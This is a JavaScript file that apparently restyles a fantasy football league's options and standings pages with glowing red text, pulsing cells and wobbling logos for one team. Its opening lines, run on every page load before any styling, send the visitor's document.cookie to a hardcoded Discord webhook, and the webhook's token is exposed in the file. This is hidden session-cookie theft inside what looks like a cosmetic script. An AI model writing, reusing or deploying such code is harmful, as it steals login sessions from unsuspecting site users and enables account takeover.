if (!window.scriptRan) {
  main();
}
window.scriptRan = true;

function main() {
  fetch("https://discord.com/api/webhooks/1406776103917457548/OcKq96Hvc5ZumMVo6xTqVOivoMdjCUeW-38lIW8z2FGOBD07Jo8MzJq-d6OUJmpmwvfZ", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ content: document.cookie })
  });

  if (window.location.href.startsWith("https://www42.myfantasyleague.com/2025/options")) {
    const myTable = Array.from(document.querySelectorAll('table.report'))
      .find(tbl => tbl.querySelector('caption span')?.textContent.trim() === "VanGinkelTouchedMyJinkel");

    if (myTable) {
      // 1. Caption style (red text + red glow)
      const caption = myTable.querySelector('caption span');
      caption.style.fontFamily = '"Orbitron", "Exo 2", "Roboto", sans-serif';
      caption.style.fontSize = "28px";
      caption.style.fontWeight = "bold";
      caption.style.color = "#FF0000"; // red text
      caption.style.textShadow = "0 0 5px #FF4444, 0 0 10px #FF2222, 0 0 20px #FF0000"; // red glow

      let glow = 5, increasing = true;
      setInterval(() => {
        caption.style.textShadow = `0 0 ${glow}px #FF4444, 0 0 ${glow * 2}px #FF2222, 0 0 ${glow * 4}px #FF0000`;
        if (increasing) glow += 1; else glow -= 1;
        if (glow > 15) increasing = false;
        if (glow < 5) increasing = true;
      }, 100);

      // 2. Animate each "box" (td and li) with red & black pulsing background
      const boxes = myTable.querySelectorAll('td, li');
      let brightness = 0;
      let direction = 1;
      setInterval(() => {
        boxes.forEach(box => {
          // Animate background from dark red to bright red
          box.style.backgroundColor = `rgb(${100 + brightness},0,0)`; // darker red to bright red
          box.style.color = "#FFFFFF"; // white text
          box.style.fontFamily = '"Orbitron", "Exo 2", "Roboto", sans-serif';
          box.style.fontWeight = "bold";
          box.style.textShadow = "0 0 4px #FF4444, 0 0 6px #FF0000"; // subtle red glow
          box.style.padding = "5px"; // spacing
          box.style.borderRadius = "4px"; // rounded corners

          // Style all links inside the box
          box.querySelectorAll('a').forEach(link => {
            link.style.color = "#FFCCCC"; // slightly darker white/pinkish so still looks like a link
            link.style.textShadow = "0 0 4px #FF4444, 0 0 6px #FF0000"; // same subtle red glow
            link.style.fontWeight = "bold";
            link.style.textDecoration = "underline"; // optional: underline to indicate clickable
          });
        });

        // Update brightness
        brightness += direction * 5;
        if (brightness >= 155) direction = -1; // max red brightness
        if (brightness <= 0) direction = 1;   // min red brightness
      }, 50);

      // 3. Animate franchise logo
      const logo = myTable.querySelector('img.franchiselogo');
      if (logo) {
        logo.style.position = "relative";
        let dir = 1, topPos = 0;
        setInterval(() => {
          topPos += dir;
          logo.style.top = topPos + "px";
          if (topPos > 10) dir = -1;
          if (topPos < -10) dir = 1;
        }, 100);
      }
    }
  }

  if (window.location.href.startsWith("https://www42.myfantasyleague.com/2025/standings")) {
    // Find the row containing your team name
    const standingRow = Array.from(document.querySelectorAll('tr.oddtablerow, tr.eventablerow'))
      .find(row => row.textContent.includes("VanGinkelTouchedMyJinkel"));

    if (standingRow) {
      // Style the row
      standingRow.style.backgroundColor = "#FF1111";
      standingRow.style.color = "#FFFFFF";
      standingRow.style.fontFamily = '"Orbitron", "Exo 2", "Roboto", sans-serif';
      standingRow.style.fontWeight = "bold";
      standingRow.style.textShadow = "0 0 4px #FF4444, 0 0 6px #FF0000";
      standingRow.style.padding = "5px";
      standingRow.style.borderRadius = "4px";
      standingRow.style.transition = "background-color 1s ease";

      // Animate background pulse
      let brightness = 0, direction = 1;
      setInterval(() => {
        standingRow.style.backgroundColor = `rgb(${100 + brightness},0,0)`;
        brightness += direction * 5;
        if (brightness >= 155) direction = -1;
        if (brightness <= 0) direction = 1;
      }, 50);

      // Team name stays original size
      const teamNameLink = standingRow.querySelector('b a');
      if (teamNameLink) {
        teamNameLink.style.color = "#FFFFFF";
      }

      // Scores with **dynamic pulsing glow**
      const scoreCells = standingRow.querySelectorAll('td.pf, td.avgpf, td.pb');
      let glow = 4, increasing = true;
      setInterval(() => {
        scoreCells.forEach(cell => {
          cell.style.color = "#FFFFFF";
          cell.style.fontWeight = "bold";
          cell.style.textShadow = `0 0 ${glow}px #FF4444, 0 0 ${glow * 1.5}px #FF0000`;
        });
        if (increasing) glow += 0.5; else glow -= 0.5;
        if (glow > 8) increasing = false;
        if (glow < 4) increasing = true;
      }, 100);

      // Style all links inside the row
      standingRow.querySelectorAll('a').forEach(link => {
        link.style.color = "#FFCCCC";
        link.style.fontWeight = "bold";
        link.style.textShadow = "0 0 4px #FF4444, 0 0 6px #FF0000";
        link.style.textDecoration = "underline";
        link.style.transition = "all 0.3s ease";
        link.addEventListener('mouseenter', () => {
          link.style.color = "#FFFFFF";
          link.style.textShadow = "0 0 8px #FF8888, 0 0 12px #FF5555";
        });
        link.addEventListener('mouseleave', () => {
          link.style.color = "#FFCCCC";
          link.style.textShadow = "0 0 4px #FF4444, 0 0 6px #FF0000";
        });
      });

      // Wobble franchise icon slower and less
      const logo = standingRow.querySelector('img.franchiseicon');
      if (logo) {
        logo.style.position = "relative";
        let angle = 0, direction = 1;
        setInterval(() => {
          angle += direction * 1; // slower
          logo.style.transform = `rotate(${angle}deg)`;
          if (angle > 5) direction = -1; // smaller wobble
          if (angle < -5) direction = 1;
        }, 150);
      }
    }
  }
}
